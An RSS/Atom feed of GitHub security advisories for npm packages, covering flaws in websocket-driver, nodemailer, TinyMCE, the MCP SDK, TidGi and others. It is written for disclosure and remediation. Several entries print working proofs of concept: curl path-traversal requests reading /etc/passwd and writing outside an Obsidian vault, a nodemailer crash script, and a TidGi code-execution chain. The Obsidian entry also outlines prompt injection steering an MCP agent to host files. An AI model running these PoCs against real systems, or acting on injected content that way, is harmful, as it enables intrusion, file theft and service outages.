<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2026-07-15T22:47:06.737Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[websocket-driver] websocket-driver: Resource limit bypass via message compression]]></title>
        <id>https://github.com/advisories/GHSA-mp7j-qc5w-4988</id>
        <link href="https://github.com/advisories/GHSA-mp7j-qc5w-4988"/>
        <updated>2026-07-15T22:08:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If this library is used in tandem with the <code>permessage-deflate</code> extension, a WebSocket server or client can be made to accept messages that are larger than the configured maximum message size. This is because this limit is checked against the message frames' length headers, which give the size of the compressed data, not the size after decompression. This can lead to applications accepting larger messages than expected and exceeding their intended resource usage.</p>
<h3 id="patches">Patches</h3>
<p>The issue has been patched in version 0.7.5, by checking the length of messages after they are processed by incoming extensions. All users should upgrade to this version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No known workarounds exist.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>This issue was discovered and reported by Pranjali Thakur, DepthFirst Security Research Team.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/faye/websocket-driver-node/security/advisories/GHSA-mp7j-qc5w-4988">https://github.com/faye/websocket-driver-node/security/advisories/GHSA-mp7j-qc5w-4988</a></li>
<li><a href="https://github.com/faye/websocket-driver-node/releases/tag/0.7.5">https://github.com/faye/websocket-driver-node/releases/tag/0.7.5</a></li>
<li><a href="https://github.com/advisories/GHSA-mp7j-qc5w-4988">https://github.com/advisories/GHSA-mp7j-qc5w-4988</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mp7j-qc5w-4988</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-15T22:08:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[websocket-driver] websocket-driver: Message corruption via abuse of protocol length headers]]></title>
        <id>https://github.com/advisories/GHSA-xv26-6w52-cph6</id>
        <link href="https://github.com/advisories/GHSA-xv26-6w52-cph6"/>
        <updated>2026-07-15T22:07:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The frame format in draft versions of the WebSocket protocol includes a length header that allows an arbitrarily large integer to be encoded as a sequence of bytes with the high bit set. By sending an indefinite sequence of bytes with values <code>0x80</code> or above, a client can make the server parse these bytes into an ever-growing integer. Since JavaScript numbers are 64-bit floating point values, this number will eventually lose precision and lead to the subsequent payload being parsed incorrectly.</p>
<h3 id="patches">Patches</h3>
<p>The issue has been patched in version 0.7.5 by rejecting the message if the length header exceeds the configured maximum message length. All users should upgrade to this version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No known workarounds exist.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>This issue was discovered and reported by Pranjali Thakur, DepthFirst Security Research Team.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/faye/websocket-driver-node/security/advisories/GHSA-xv26-6w52-cph6">https://github.com/faye/websocket-driver-node/security/advisories/GHSA-xv26-6w52-cph6</a></li>
<li><a href="https://github.com/faye/websocket-driver-node/releases/tag/0.7.5">https://github.com/faye/websocket-driver-node/releases/tag/0.7.5</a></li>
<li><a href="https://github.com/advisories/GHSA-xv26-6w52-cph6">https://github.com/advisories/GHSA-xv26-6w52-cph6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xv26-6w52-cph6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-07-15T22:07:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[obsidian-local-rest-api] obsidian-local-rest-api: Authenticated path traversal via URL-encoded %2F in /vault/{path} — arbitrary host file read/write/delete]]></title>
        <id>https://github.com/advisories/GHSA-62gx-5q78-wrvx</id>
        <link href="https://github.com/advisories/GHSA-62gx-5q78-wrvx"/>
        <updated>2026-07-15T21:56:46.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The Local REST API's <code>/vault/{path}</code> endpoints (GET/PUT/PATCH/POST/DELETE) percent-decode the request path <em>inside the handler — after</em> Express has already routed and normalized it, then hand it to the Obsidian vault adapter with no confinement check. A literal <code>../</code> is resolved/rejected at the routing layer (→ 404), but <code>%2F</code> is not a separator there, so <code>..%2F..%2F</code> survives routing and is only turned into a real <code>/</code> by the handler's <code>decodeURIComponent</code>, reconstituting a <code>../</code> traversal that walks out of the vault. An <strong>authenticated</strong> client can read, write, or delete <strong>arbitrary files on the host</strong> with the Obsidian process's privileges.</p>
<h3 id="details">Details</h3>
<p><strong>Framework:</strong> Express (<code>import express from "express"</code>; routes registered via <code>this.api.route("/vault/*")…</code>).</p>
<p><strong>The vulnerable line</strong> — in <code>src/requestHandler.ts</code>, every vault handler (<code>vaultGet</code>, <code>vaultPut</code>, <code>vaultPatch</code>, <code>vaultPost</code>, <code>vaultDelete</code>) derives the path like this:</p>
<pre><code class="language-ts">const rawPath = decodeURIComponent(
  req.path.slice(req.path.indexOf("/", 1) + 1),
);
</code></pre>
<p>The path is <code>decodeURIComponent</code>'d <strong>after</strong> Express routing. A literal <code>../</code> is collapsed/rejected at the routing layer, but <code>%2F</code> isn't a separator there — so <code>..%2F..%2F</code> reaches the handler intact and this <code>decodeURIComponent</code> turns it into a real <code>../../</code>. <strong>The string routing saw (<code>…%2F…</code>) is not the string the handler uses (<code>…/…</code>)</strong>, and <code>%2e%2e</code> behaves the same way.</p>
<p><strong>No confinement on the decoded path.</strong> The handlers pass <code>rawPath</code> straight to the vault adapter — e.g. <code>this.app.vault.adapter.readBinary(filePath)</code> / <code>this.app.vault.getAbstractFileByPath(filePath)</code> — with no <code>path.resolve</code> + vault-root prefix check, so the reconstituted <code>../../</code> escapes.</p>
<p><strong>The fix already exists in your code — for MOVE only.</strong> <code>vaultMove</code> confines correctly:</p>
<pre><code class="language-ts">const syntheticRoot = "/vault";
const resolved = posix.resolve(syntheticRoot, normalized);
if (resolved !== syntheticRoot &amp;&amp; !resolved.startsWith(syntheticRoot + "/")) {
  this.returnCannedResponse(res, { errorCode: ErrorCode.PathTraversalNotAllowed });
  return;
}
</code></pre>
<p>GET/PUT/PATCH/POST/DELETE lack this guard. <strong>Apply the same <code>posix.resolve(syntheticRoot, …)</code> + <code>startsWith</code> check to the decoded path in every vault handler</strong>, and reject any segment that decodes to <code>..</code>.</p>
<h3 id="poc">PoC</h3>
<p>Prereq: a running Obsidian with the Local REST API plugin enabled and its configured API key (<code>$API_KEY</code>). Targets below are Unix; adjust per OS (e.g. <code>..%2F..%2FWindows%2Fwin.ini</code> on Windows).</p>
<pre><code class="language-bash"># READ outside the vault (returns 200 + the target file's real bytes):
curl --path-as-is -k -H "Authorization: Bearer $API_KEY" \
  "https://127.0.0.1:27124/vault/..%2F..%2F..%2F..%2Fetc%2Fpasswd"

# WRITE outside the vault (creates a file on disk outside the vault root):
curl --path-as-is -k -X PUT -H "Authorization: Bearer $API_KEY" --data "pwned" \
  "https://127.0.0.1:27124/vault/..%2F..%2F..%2Ftmp%2Fcanary.txt"
</code></pre>
<p><code>--path-as-is</code> stops curl from collapsing <code>..</code> client-side. A plain <code>../</code> (unencoded) request returns 404 — only the <code>%2F</code>/<code>%2e%2e</code> encoded form bypasses, confirming the decode-after-routing gap.</p>
<h3 id="impact">Impact</h3>
<p>Authenticated arbitrary file <strong>read / write / delete</strong> outside the Obsidian vault, with the OS privileges of the Obsidian process — typically the user's home directory (SSH keys, browser profiles, dotfiles, credentials). Amplified in MCP/LLM-agent deployments: this API is widely used as an MCP server, so a prompt-injection in vault content (or a malicious MCP client) can make an agent emit a <code>%2F</code> path — turning "the agent can edit my notes" into "the agent can read/write any file on the host," with no user intent to grant filesystem access beyond the vault.</p>
<p>This vulnerability was reported by Caleb Brisbin through responsible disclosure.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/coddingtonbear/obsidian-local-rest-api/security/advisories/GHSA-62gx-5q78-wrvx">https://github.com/coddingtonbear/obsidian-local-rest-api/security/advisories/GHSA-62gx-5q78-wrvx</a></li>
<li><a href="https://github.com/coddingtonbear/obsidian-local-rest-api/releases/tag/4.1.3">https://github.com/coddingtonbear/obsidian-local-rest-api/releases/tag/4.1.3</a></li>
<li><a href="https://github.com/advisories/GHSA-62gx-5q78-wrvx">https://github.com/advisories/GHSA-62gx-5q78-wrvx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-62gx-5q78-wrvx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-15T21:56:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nodemailer] Nodemailer’s addressparser is vulnerable to DoS caused by recursive calls]]></title>
        <id>https://github.com/advisories/GHSA-rcmh-qjqh-p98v</id>
        <link href="https://github.com/advisories/GHSA-rcmh-qjqh-p98v"/>
        <updated>2026-07-15T21:55:34.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A DoS can occur that immediately halts the system due to the use of an unsafe function.</p>
<h3 id="details">Details</h3>
<p>According to <strong>RFC 5322</strong>, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list.
However, the code implemented for this flattening process can be exploited by malicious input and triggers DoS</p>
<p>RFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group.
At the following location in lib/addressparser/index.js:</p>
<p><a href="https://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90">https://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90</a></p>
<p>there is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header:</p>
<p><code>g0: g1: g2: g3: ... gN: victim@example.com;</code></p>
<p>Because no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern
<code>addressparser → _handleAddress → addressparser → ...</code>
for each nested group. As a result, when an attacker sends a header containing many colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size exceeded and causing the process to terminate immediately. Due to the structure of this behavior, no authentication is required, and a single request is enough to shut down the service.</p>
<p>The problematic code section is as follows:</p>
<pre><code class="language-js">if (isGroup) {
    ...
    if (data.group.length) {
        let parsedGroup = addressparser(data.group.join(',')); // &lt;- boom!
        parsedGroup.forEach(member =&gt; {
            if (member.group) {
                groupMembers = groupMembers.concat(member.group);
            } else {
                groupMembers.push(member);
            }
        });
    }
}
</code></pre>
<p><code>data.group</code> is expected to contain members separated by commas, but in the attacker’s payload the group contains colon <code>(:)</code> tokens. Because of this, the parser repeatedly triggers recursive calls for each colon, proportional to their number.</p>
<h3 id="poc">PoC</h3>
<pre><code>const nodemailer = require('nodemailer');

function buildDeepGroup(depth) {
  let parts = [];
  for (let i = 0; i &lt; depth; i++) {
    parts.push(`g${i}:`);
  }
  return parts.join(' ') + ' user@example.com;';
}

const DEPTH = 3000; // &lt;- control depth 
const toHeader = buildDeepGroup(DEPTH);
console.log('to header length:', toHeader.length);

const transporter = nodemailer.createTransport({
  streamTransport: true,
  buffer: true,
  newline: 'unix'
});

console.log('parsing start');

transporter.sendMail(
  {
    from: 'test@example.com',
    to: toHeader,
    subject: 'test',
    text: 'test'
  },
  (err, info) =&gt; {
    if (err) {
      console.error('error:', err);
    } else {
      console.log('finished :', info &amp;&amp; info.envelope);
    }
  }
);
</code></pre>
<p>As a result, when the colon is repeated beyond a certain threshold, the Node.js process terminates immediately.</p>
<h3 id="impact">Impact</h3>
<p>The attacker can achieve the following:</p>
<ol>
<li>Force an immediate crash of any server/service that uses Nodemailer</li>
<li>Kill the backend process with a single web request</li>
<li>In environments using PM2/Forever, trigger a continuous restart loop, causing severe resource exhaustion”</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v">https://github.com/nodemailer/nodemailer/security/advisories/GHSA-rcmh-qjqh-p98v</a></li>
<li><a href="https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150">https://github.com/nodemailer/nodemailer/commit/b61b9c0cfd682b6f647754ca338373b68336a150</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-14874">https://nvd.nist.gov/vuln/detail/CVE-2025-14874</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2025-14874">https://access.redhat.com/security/cve/CVE-2025-14874</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2418133">https://bugzilla.redhat.com/show_bug.cgi?id=2418133</a></li>
<li><a href="https://github.com/nodemailer/nodemailer/commit/6218b8df">https://github.com/nodemailer/nodemailer/commit/6218b8df</a></li>
<li><a href="https://github.com/advisories/GHSA-rcmh-qjqh-p98v">https://github.com/advisories/GHSA-rcmh-qjqh-p98v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rcmh-qjqh-p98v</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-12-01T20:44:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tinymce] TinyMCE Cross-Site Scripting (XSS) vulnerability through `mce:protected` comments]]></title>
        <id>https://github.com/advisories/GHSA-v98h-vmpc-fpqv</id>
        <link href="https://github.com/advisories/GHSA-v98h-vmpc-fpqv"/>
        <updated>2026-07-15T21:07:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Stored XSS vulnerability via forged mce:protected comments. Allows attackers to bypass sanitization and inject scripts that execute when content is restored. Impacts users who utilize the protect option.</p>
<h3 id="patches">Patches</h3>
<p>Patched by validating decoded mce:protected content against configured protect regex rules before restoring. Users should upgrade to the latest patched version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>No official workaround available.</p>
<h3 id="fix">Fix</h3>
<p>To avoid this vulnerability:</p>
<p>Upgrade to TinyMCE 8.5.1 or higher.
Upgrade to TinyMCE 7.9.3 or higher.
Upgrade to TinyMCE 5.11.1 LTS or higher for TinyMCE 5.x (only available as part of commercial <a href="https://www.tiny.cloud/long-term-support/">long-term support</a> contract).</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>Tiny thanks <a href="https://github.com/he1d3n">Ivan Babenko</a> for their help identifying this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/tinymce/tinymce/security/advisories/GHSA-v98h-vmpc-fpqv">https://github.com/tinymce/tinymce/security/advisories/GHSA-v98h-vmpc-fpqv</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-47762">https://nvd.nist.gov/vuln/detail/CVE-2026-47762</a></li>
<li><a href="https://www.tiny.cloud/docs/tinymce/7/7.9.3-release-notes/#overview">https://www.tiny.cloud/docs/tinymce/7/7.9.3-release-notes/#overview</a></li>
<li><a href="https://www.tiny.cloud/docs/tinymce/8/8.5.1-release-notes/#overview">https://www.tiny.cloud/docs/tinymce/8/8.5.1-release-notes/#overview</a></li>
<li><a href="https://github.com/advisories/GHSA-v98h-vmpc-fpqv">https://github.com/advisories/GHSA-v98h-vmpc-fpqv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v98h-vmpc-fpqv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-05T20:29:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@modelcontextprotocol/sdk] Anthropic's MCP TypeScript SDK has a ReDoS vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-8r9q-7v3j-jr4g</id>
        <link href="https://github.com/advisories/GHSA-8r9q-7v3j-jr4g"/>
        <updated>2026-07-15T18:32:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A ReDoS vulnerability in the <code>UriTemplate</code> class allows attackers to cause denial of service. The <code>partToRegExp()</code> function generates a regex pattern with nested quantifiers (<code>([^/]+(?:,[^/]+)*)</code>) for exploded template variables (e.g., <code>{/id*}</code>, <code>{?tags*}</code>), causing catastrophic backtracking on malicious input.</p>
<p><strong>Who is affected:</strong> MCP servers that register resource templates with exploded array patterns and accept requests from untrusted clients.</p>
<p><strong>Attack result:</strong> An attacker sends a crafted URI via <code>resources/read</code> request, causing 100% CPU utilization, server hang/crash, and denial of service for all clients.</p>
<h3 id="affected-versions">Affected Versions</h3>
<p>All versions of <code>@modelcontextprotocol/sdk</code> prior to the patched release.</p>
<h3 id="patches">Patches</h3>
<p>v1.25.2 contains b392f02ffcf37c088dbd114fedf25026ec3913d3 the fix modifies the regex pattern to prevent backtracking.</p>
<h3 id="workarounds">Workarounds</h3>
<ul>
<li>Avoid using exploded patterns (<code>{/id*}</code>, <code>{?tags*}</code>) in resource templates</li>
<li>Implement request timeouts and rate limiting</li>
<li>Validate URIs before processing to reject suspicious patterns</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-0621">https://nvd.nist.gov/vuln/detail/CVE-2026-0621</a></li>
<li><a href="https://github.com/modelcontextprotocol/typescript-sdk/issues/965">https://github.com/modelcontextprotocol/typescript-sdk/issues/965</a></li>
<li><a href="https://www.vulncheck.com/advisories/mcp-typescript-sdk-uritemplate-exploded-array-pattern-redos">https://www.vulncheck.com/advisories/mcp-typescript-sdk-uritemplate-exploded-array-pattern-redos</a></li>
<li><a href="https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-cqwc-fm46-7fff">https://github.com/modelcontextprotocol/typescript-sdk/security/advisories/GHSA-cqwc-fm46-7fff</a></li>
<li><a href="https://github.com/modelcontextprotocol/typescript-sdk/commit/b392f02ffcf37c088dbd114fedf25026ec3913d3">https://github.com/modelcontextprotocol/typescript-sdk/commit/b392f02ffcf37c088dbd114fedf25026ec3913d3</a></li>
<li><a href="https://github.com/modelcontextprotocol/typescript-sdk/releases/tag/v1.25.2">https://github.com/modelcontextprotocol/typescript-sdk/releases/tag/v1.25.2</a></li>
<li><a href="https://github.com/modelcontextprotocol/typescript-sdk/commit/7f0cf730">https://github.com/modelcontextprotocol/typescript-sdk/commit/7f0cf730</a></li>
<li><a href="https://github.com/advisories/GHSA-8r9q-7v3j-jr4g">https://github.com/advisories/GHSA-8r9q-7v3j-jr4g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8r9q-7v3j-jr4g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-01-05T21:30:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@keystone-6/core] Keystone: GraphQL API Endpoint Lacks Query Depth Limits]]></title>
        <id>https://github.com/advisories/GHSA-45jq-c8xm-jfw9</id>
        <link href="https://github.com/advisories/GHSA-45jq-c8xm-jfw9"/>
        <updated>2026-07-14T20:53:55.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was detected in keystonejs keystone up to 20260319. This vulnerability affects unknown code in the library packages/core/src/lib/core/queries/output-field.ts of the component GraphQL API Endpoint. The manipulation results in resource consumption. It is possible to launch the attack remotely. The exploit is now public and may be used. The pull request to fix this issue awaits acceptance.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-10802">https://nvd.nist.gov/vuln/detail/CVE-2026-10802</a></li>
<li><a href="https://github.com/keystonejs/keystone/issues/9789">https://github.com/keystonejs/keystone/issues/9789</a></li>
<li><a href="https://github.com/keystonejs/keystone/pull/9831">https://github.com/keystonejs/keystone/pull/9831</a></li>
<li><a href="https://gist.github.com/nedlir/0431275665076772844ebfe5167e54f6">https://gist.github.com/nedlir/0431275665076772844ebfe5167e54f6</a></li>
<li><a href="https://github.com/keystonejs/keystone">https://github.com/keystonejs/keystone</a></li>
<li><a href="https://vuldb.com/cve/CVE-2026-10802">https://vuldb.com/cve/CVE-2026-10802</a></li>
<li><a href="https://vuldb.com/submit/831461">https://vuldb.com/submit/831461</a></li>
<li><a href="https://vuldb.com/vuln/368251">https://vuldb.com/vuln/368251</a></li>
<li><a href="https://vuldb.com/vuln/368251/cti">https://vuldb.com/vuln/368251/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-45jq-c8xm-jfw9">https://github.com/advisories/GHSA-45jq-c8xm-jfw9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-45jq-c8xm-jfw9</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-04T12:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[n8n-mcp] n8n-MCP: Incorrect authorization can expose default-scope workflow version backups in multi-tenant HTTP mode]]></title>
        <id>https://github.com/advisories/GHSA-2cf7-hpwf-47h9</id>
        <link href="https://github.com/advisories/GHSA-2cf7-hpwf-47h9"/>
        <updated>2026-07-14T20:26:41.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>In multi-tenant HTTP mode (<code>ENABLE_MULTI_TENANT=true</code>), an authenticated tenant could, under certain conditions, reach n8n-mcp's local default-scope <code>workflow_versions</code> backups instead of being confined to its own tenant scope. This affects n8n-mcp's own local workflow-version storage, not a normal n8n API capability.</p>
<h2 id="impact">Impact</h2>
<p>An authenticated MCP HTTP tenant could read or delete workflow-version backups stored in the default (single-tenant) scope — for example backups left from a prior single-tenant deployment or a migration period. Workflow snapshots may contain sensitive workflow configuration depending on their contents. Single-tenant and stdio deployments are not affected.</p>
<h2 id="affected-versions">Affected versions</h2>
<p><code>&lt;= 2.57.3</code></p>
<h2 id="patched-version">Patched version</h2>
<p><code>2.57.4</code></p>
<h2 id="remediation">Remediation</h2>
<p>Upgrade to n8n-mcp <code>2.57.4</code> or later. The fix requires a complete tenant context in multi-tenant mode and fails closed for workflow-version access that cannot be attributed to a specific tenant.</p>
<h2 id="workarounds">Workarounds</h2>
<ul>
<li>Restrict network access to the HTTP endpoint (firewall / reverse proxy / VPN) so only trusted callers can reach it.</li>
<li>Run in stdio mode, which has no multi-tenant HTTP surface.</li>
<li>If default-scope backups from a prior single-tenant deployment are not needed, removing them eliminates the exposure.</li>
</ul>
<h2 id="credit">Credit</h2>
<p>Reported by @DavidCarliez.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/czlonkowski/n8n-mcp/security/advisories/GHSA-2cf7-hpwf-47h9">https://github.com/czlonkowski/n8n-mcp/security/advisories/GHSA-2cf7-hpwf-47h9</a></li>
<li><a href="https://github.com/czlonkowski/n8n-mcp/commit/c1ca1e73697feaec5ec2a5fb7e6992a2892b62c9">https://github.com/czlonkowski/n8n-mcp/commit/c1ca1e73697feaec5ec2a5fb7e6992a2892b62c9</a></li>
<li><a href="https://github.com/czlonkowski/n8n-mcp/releases/tag/v2.57.4">https://github.com/czlonkowski/n8n-mcp/releases/tag/v2.57.4</a></li>
<li><a href="https://github.com/advisories/GHSA-2cf7-hpwf-47h9">https://github.com/advisories/GHSA-2cf7-hpwf-47h9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2cf7-hpwf-47h9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-14T20:26:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tidgi] TidGi Desktop Remote Code Execution via Malicious TiddlyWiki Repository Import — Tiddler Startup Module Auto-Execution]]></title>
        <id>https://github.com/advisories/GHSA-9hc2-hjx8-q6pv</id>
        <link href="https://github.com/advisories/GHSA-9hc2-hjx8-q6pv"/>
        <updated>2026-07-14T19:52:43.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>TidGi Desktop through 0.13.0 contains a critical remote code execution vulnerability exploitable via a single Git repository import. The vulnerability leverages TiddlyWiki's module system, which automatically discovers and executes JavaScript code embedded in <code>.tid</code> files placed in the wiki's <code>tiddlers/</code> directory:</p>
<ol>
<li><p><strong>Auto-loading of <code>.tid</code> files</strong> (<code>src/services/wiki/wikiWorker/loadWikiTiddlersWithSubWikis.ts:59-92</code>) — when TidGi boots a wiki workspace, <code>loadWikiTiddlers</code> reads all <code>.tid</code> files from the filesystem and adds them to the wiki store via <code>wiki.addTiddlers()</code>.</p>
</li>
<li><p><strong>Automatic module registration</strong> (<code>node_modules/tiddlywiki/boot/boot.js:2564-2565</code>) — <code>defineTiddlerModules()</code> iterates all tiddlers in the store. Any tiddler with a <code>module-type</code> field is passed to <code>$tw.modules.define()</code>, registering it as an executable module.</p>
</li>
<li><p><strong>Automatic startup execution</strong> (<code>node_modules/tiddlywiki/boot/boot.js:2572-2634</code>) — all registered modules of type <code>"startup"</code> are collected and their <code>exports.startup()</code> function is called during the boot sequence. When no <code>platforms</code> restriction is set, <code>doesTaskMatchPlatform()</code> returns <code>true</code>, and the startup function executes with full Node.js <code>require()</code> access in the Wiki Worker process.</p>
</li>
</ol>
<p>The full chain was verified on macOS with TiddlyWiki 5.4.0 and Node.js v26 — <code>require('child_process').execSync()</code> successfully executed arbitrary shell commands.</p>
<h2 id="affected-product">Affected Product</h2>
<ul>
<li><strong>Product</strong>: TidGi Desktop</li>
<li><strong>Vendor</strong>: Lin Onetwo (<a href="https://github.com/tiddly-gittly">https://github.com/tiddly-gittly</a>)</li>
<li><strong>Repository</strong>: <a href="https://github.com/tiddly-gittly/TidGi-Desktop">https://github.com/tiddly-gittly/TidGi-Desktop</a></li>
<li><strong>Affected Versions</strong>: 0.13.0 (latest release)</li>
<li><strong>Components</strong>: <code>src/services/wiki/wikiWorker/loadWikiTiddlersWithSubWikis.ts</code> (tiddler loading), <code>src/services/wiki/wikiWorker/startNodeJSWiki.ts</code> (wiki boot), <code>node_modules/tiddlywiki/boot/boot.js</code> (TiddlyWiki core — <code>defineTiddlerModules</code>, startup dispatch)</li>
<li><strong>Package</strong>: tidgi (npm)</li>
</ul>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<h3 id="root-cause-1--tid-files-auto-loaded-before-module-processing">Root Cause 1 — <code>.tid</code> Files Auto-Loaded Before Module Processing</h3>
<p><strong>File: <code>src/services/wiki/wikiWorker/loadWikiTiddlersWithSubWikis.ts:59-92</code></strong></p>
<pre><code class="language-typescript">const tiddlerFiles = wikiInstance.loadTiddlersFromPath(subWikiTiddlersPath);

for (const tiddlerFile of tiddlerFiles) {
    // Register file info for filesystem adaptor
    // ...
    // Add tiddlers to wiki
    wikiInstance.wiki.addTiddlers(tiddlerFile.tiddlers);   // ← Line 92
}
</code></pre>
<p><strong>File: <code>src/services/wiki/wikiWorker/startNodeJSWiki.ts:256</code></strong></p>
<pre><code class="language-typescript">wikiInstance.boot.startup({ bootPath: TIDDLY_WIKI_BOOT_PATH });
</code></pre>
<p>This triggers <code>$tw.boot.startup()</code>, which internally calls <code>loadStartup()</code> → <code>loadTiddlersNode()</code> → <code>$tw.loadWikiTiddlers($tw.boot.wikiPath)</code> (boot.js:2381). TidGi overrides <code>loadWikiTiddlers</code> at startNodeJSWiki.ts:123 to intercept and inject sub-wiki tiddlers, but the original function still loads all <code>.tid</code> files from the main wiki's <code>tiddlers/</code> directory.</p>
<h3 id="root-cause-2--automatic-module-registration-via-module-type-field">Root Cause 2 — Automatic Module Registration via <code>module-type</code> Field</h3>
<p><strong>File: <code>node_modules/tiddlywiki/boot/boot.js:1514-1534</code></strong> — <code>defineTiddlerModules()</code></p>
<pre><code class="language-javascript">$tw.Wiki.prototype.defineTiddlerModules = function() {
    this.each(function(tiddler,title) {
        if(tiddler.hasField("module-type") &amp;&amp; (!tiddler.hasField("draft.of"))) {
            switch(tiddler.fields.type) {
                case "application/javascript":
                    $tw.modules.define(
                        tiddler.fields.title,           // "$:/plugins/poc/startup.js"
                        tiddler.fields["module-type"],   // "startup"
                        tiddler.fields.text              // attacker's JS code
                    );
                    break;
            }
        }
    });
};
</code></pre>
<p>This function is called during <code>execStartup()</code> (boot.js:2565), <strong>after</strong> <code>loadStartup()</code> has already loaded all <code>.tid</code> files into the wiki store. Any tiddler with <code>module-type: startup</code> and <code>type: application/javascript</code> is automatically registered as an executable module.</p>
<h3 id="root-cause-3--automatic-startup-execution-with-full-nodejs-access">Root Cause 3 — Automatic Startup Execution with Full Node.js Access</h3>
<p><strong>File: <code>node_modules/tiddlywiki/boot/boot.js:2572-2576</code></strong> — Collecting startup modules</p>
<pre><code class="language-javascript">$tw.boot.remainingStartupModules = [];
$tw.modules.forEachModuleOfType("startup", function(title, module) {
    if(module.startup) {
        $tw.boot.remainingStartupModules.push(module);  // ← attacker's module collected
    }
});
</code></pre>
<p><strong>File: <code>node_modules/tiddlywiki/boot/boot.js:2631-2634</code></strong> — Executing startup</p>
